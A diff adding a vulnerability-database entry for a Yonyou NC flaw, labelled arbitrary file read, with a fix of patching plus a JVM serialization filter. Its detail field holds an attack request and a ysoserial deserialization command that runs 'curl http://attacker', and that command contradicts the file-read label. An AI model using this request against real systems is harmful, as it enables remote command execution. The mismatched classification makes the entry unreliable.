@@ -1,0 +1,14 @@
+vendor = "用友"
+name = "用友NC 任意文件读取漏洞 TVD-2026-15337"
+type = "任意文件读取"
+path = "/nc/"
+version = ""
+detail = """POST /ServiceDispatcher/ResourceManagerServlet HTTP/1.1 Host: target Content-Type: application/x-java-serialized-object
+
+<ysoserial CommonsCollections6 payload>
+java -jar ysoserial.jar CommonsCollections6 'curl http://attacker' > payload.bin"""
+fix = "安装官方补丁；添加 -Djdk.serialFilter=!*"
+date = 20260601
+label = "nday"
+cve = "TVD-2026-15337"
+verifier = "AdySec"
